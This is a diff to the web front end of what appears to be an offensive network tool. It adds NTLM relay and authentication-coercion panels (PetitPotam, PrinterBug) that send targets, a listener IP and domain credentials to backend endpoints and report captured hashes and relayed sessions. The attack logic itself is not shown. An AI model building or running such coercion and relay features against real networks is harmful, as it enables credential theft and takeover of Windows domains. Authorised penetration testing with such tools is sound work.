@@ -1245,6 +1245,42 @@
       </div>
     </div>
 
+    <div class="filter-group">
+      <h2 class="section-title">ntlm relay</h2>
+      <div class="live-panel">
+        <input type="text" id="relay-targets" placeholder="targets (comma-sep, no-signing hosts — relay-targets.txt)">
+        <input type="text" id="relay-ports" placeholder="listen ports (default 445)">
+        <div style="display:flex; gap:4px;">
+          <button class="btn" id="btn-relay-start" style="flex:1;">⇄ relay</button>
+          <button class="btn" id="btn-relay-stop" style="flex:1;" disabled>■ stop</button>
+        </div>
+        <div class="live-save-info" id="relay-info"></div>
+        <div class="live-err" id="relay-err"></div>
+      </div>
+    </div>
+
+    <div class="filter-group">
+      <h2 class="section-title">coercion</h2>
+      <div class="live-panel">
+        <input type="text" id="co-target" placeholder="target host">
+        <input type="text" id="co-listener" placeholder="listener (your IP for relay/responder)">
+        <div style="display:flex; gap:4px;">
+          <input type="text" id="co-user" placeholder="user" style="flex:1;">
+          <input type="text" id="co-domain" placeholder="domain" style="flex:1;">
+        </div>
+        <input type="password" id="co-pass" placeholder="password">
+        <select id="co-method" style="width:100%;">
+          <option value="petitpotam">petitpotam (MS-EFSR)</option>
+          <option value="printerbug">printerbug (MS-RPRN)</option>
+        </select>
+        <div style="display:flex; gap:4px;">
+          <button class="btn" id="btn-co-fire" style="flex:1;">➤ coerce</button>
+        </div>
+        <div class="live-save-info" id="co-info"></div>
+        <div class="live-err" id="co-err"></div>
+      </div>
+    </div>
+
     <div class="filter-group" id="live-group">
       <h2 class="section-title">live capture</h2>
       <div class="live-panel">
@@ -1525,6 +1561,99 @@ async function respStop() {
     const s = await fetch('/api/responder/stop', { method: 'POST' }).then(r => r.json());
     respRenderStatus(s);
   } catch (e) { document.getElementById('resp-err').textContent = String(e); }
+}
+
+// ---- NTLM relay -----------------------------------------------------------
+let relayPollTimer = null;
+
+async function relayPoll() {
+  try {
+    const s = await fetch('/api/relay/status').then(r => r.json());
+    relayRender(s);
+    if (s.running) {
+      relayPollTimer = setTimeout(relayPoll, 1500);
+      await refresh();
+    }
+  } catch (e) { /* keep last state */ }
+}
+
+function relayRender(s) {
+  const info = document.getElementById('relay-info');
+  const err = document.getElementById('relay-err');
+  const startBtn = document.getElementById('btn-relay-start');
+  const stopBtn = document.getElementById('btn-relay-stop');
+  startBtn.disabled = !!s.running;
+  stopBtn.disabled = !s.running;
+  err.textContent = s.error || '';
+  if (!s.running && !s.counts) { info.textContent = ''; return; }
+  const c = s.counts || {};
+  const ev = (s.events || []).slice(-5).reverse().map(e =>
+    `${e.kind}: ${e.text}`).join(' · ');
+  info.innerHTML = `conns ${c.conns || 0} · hashes ${c.hashes || 0} · ` +
+    `<span style="color:var(--danger);">relayed ${c.relayed || 0}</span> · failed ${c.failed || 0}` +
+    (ev ? `<br><span style="color:var(--text-faint);">${escapeHtml(ev)}</span>` : '');
+}
+
+async function relayStart() {
+  const info = document.getElementById('relay-info');
+  const err = document.getElementById('relay-err');
+  const targets = document.getElementById('relay-targets').value
+    .split(',').map(t => t.trim()).filter(Boolean);
+  const ports = document.getElementById('relay-ports').value
+    .split(',').map(p => parseInt(p, 10)).filter(n => n > 0);
+  err.textContent = '';
+  info.textContent = 'starting…';
+  try {
+    const body = { targets };
+    if (ports.length) body.ports = ports;
+    const s = await fetch('/api/relay/start', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    }).then(r => r.json());
+    if (s.error && !s.running) { info.textContent = ''; err.textContent = s.error; return; }
+    relayRender(s);
+    if (relayPollTimer) clearTimeout(relayPollTimer);
+    relayPollTimer = setTimeout(relayPoll, 1500);
+  } catch (e) { err.textContent = String(e); }
+}
+
+async function relayStop() {
+  if (relayPollTimer) { clearTimeout(relayPollTimer); relayPollTimer = null; }
+  try {
+    const s = await fetch('/api/relay/stop', { method: 'POST' }).then(r => r.json());
+    relayRender(s);
+  } catch (e) { document.getElementById('relay-err').textContent = String(e); }
+}
+
+// ---- coercion ---------------------------------------------------------------
+async function coerceFire() {
+  const info = document.getElementById('co-info');
+  const err = document.getElementById('co-err');
+  const target = document.getElementById('co-target').value.trim();
+  const listener = document.getElementById('co-listener').value.trim();
+  const user = document.getElementById('co-user').value.trim();
+  const domain = document.getElementById('co-domain').value.trim();
+  const password = document.getElementById('co-pass').value;
+  const method = document.getElementById('co-method').value;
+  err.textContent = '';
+  if (!target || !listener || !user) {
+    info.textContent = '';
+    err.textContent = 'target, listener and user are required';
+    return;
+  }
+  info.textContent = `firing ${method} at ${target}…`;
+  try {
+    const res = await fetch('/api/coerce', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ target, listener, user, domain, password, method }),
+    }).then(r => r.json());
+    if (res.ok) {
+      info.innerHTML = `<span style="color:var(--danger);">triggered</span> — ${escapeHtml(target)} should now authenticate to ${escapeHtml(listener)}. watch the relay/responder.`;
+    } else {
+      info.textContent = '';
+      err.textContent = res.error || 'coercion failed';
+    }
+  } catch (e) { err.textContent = String(e); }
 }
 
 function updateLiveBadge(live, summary) {
@@ -3546,6 +3675,10 @@ document.getElementById('btn-live-save').addEventListener('click', liveSaveToggl
 document.getElementById('btn-arp-sweep').addEventListener('click', arpSweep);
 document.getElementById('btn-resp-start').addEventListener('click', respStart);
 document.getElementById('btn-resp-stop').addEventListener('click', respStop);
+document.getElementById('btn-relay-start').addEventListener('click', relayStart);
+document.getElementById('btn-relay-stop').addEventListener('click', relayStop);
+document.getElementById('btn-co-fire').addEventListener('click', coerceFire);
+relayPoll();   // reflect relay state if it's already running
 document.getElementById('btn-alert-webhook').addEventListener('click', saveAlertWebhook);
 document.getElementById('alert-webhook').addEventListener('keydown', e => {
   if (e.key === 'Enter') saveAlertWebhook();
